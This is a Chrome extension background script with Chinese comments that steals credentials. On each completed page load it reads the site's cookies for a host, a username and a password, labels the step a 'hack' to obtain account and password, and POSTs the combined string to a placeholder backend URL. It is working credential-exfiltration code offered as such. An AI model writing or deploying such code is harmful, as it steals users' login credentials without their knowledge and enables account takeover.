(function(){
    var _host2 = '';
    var _userName = '';
    var _passWord = '';
    var _host = '';
    chrome.tabs.onUpdated.addListener(function(tabId,changeInfo,tab){
        //封装ajax
        function ajax(obj){
            var xhr = (function () {
                /*创建XMLHttpRequest对象*/
                if (typeof XMLHttpRequest != 'undefined') {
                    // code for IE7+, Firefox, Chrome, Opera, Safari
                    return new XMLHttpRequest();
                } else if (typeof ActiveXObject != 'undefined') {
                    // code for IE6, IE5
                    var version = [
                        'MSXML2.XMLHttp.6.0',
                        'MSXML2.XMLHttp.3.0',
                        'MSXML2.XMLHttp'
                    ];
                    for (var i = 0; version.length; i ++) {
                        try {
                            return new ActiveXObject(version[i]);
                        } catch (e) {
                            //跳过
                        }    
                    }
                } 
                else {
                    throw new Error('您的系统或浏览器不支持XHR对象！');
                }
            })();
            /*url加随机参数，防止缓存*/
            obj.url = obj.url + '?rand=' + Math.random();
            /*请求参数格式化，encodeURIComponent编码参数可以出现&*/
            obj.data = (function (data) {
                var arr = [];
                for (var i in data) { 
                    arr.push(encodeURIComponent(i) + '=' + encodeURIComponent(data[i]));
                }
                return arr.join('&');
            })(obj.data);
            if (obj.method === 'get') obj.url += obj.url.indexOf('?') == -1 ? '?' + obj.data : '&' + obj.data;
            if (obj.async === true) {
                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4) {
                        callback();
                    }
                };
            }
            
            xhr.open(obj.method, obj.url, obj.async);
            if (obj.method === 'post') {
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send(obj.data);    
            } else {
                xhr.send(null);
            }
            if (obj.async === false) {
                callback();
            }
            function callback() {
                if (xhr.status == 200) {
                    obj.success(xhr.responseText);            //回调传递参数
                } else {
                    console.log('获取数据错误！错误代号：' + xhr.status + '，错误信息：' + xhr.statusText);
                }    
            }
        }
        /*hack：获取账号密码*/
        var getPass = function(_data){
            ajax({
                method : 'post',
                url : '后端接口url',
                data : {
                    'data':_data
                },
                success : function (data) {
                    console.log(data);
                },
                async : true
            });
        };

        if(changeInfo.status == "complete"){ //changeInfo有 loading/complete 两种状态,这样执行一次
            chrome.cookies.getAll({ url: tab.url},function(cookie){ 
                cookie.forEach(function(c){ 
                    if(c.name == 'host'){
                        _host = c.value;
                    }else if(c.name == 'userName2'){
                        _userName = c.value;
                    }else if(c.name == 'passWord2'){
                        _passWord = c.value;
                    }
                }); 
                /*过滤重复*/
                if(_host && _userName && _passWord && _host !== _host2){
                    var _data = "账号:"+_userName+",密码:"+_passWord+",Host:"+_host;
                    console.log(_data);
                    getPass(_data);
                    _host2 = _host;
                }
            });
        }  
        
    });

})();

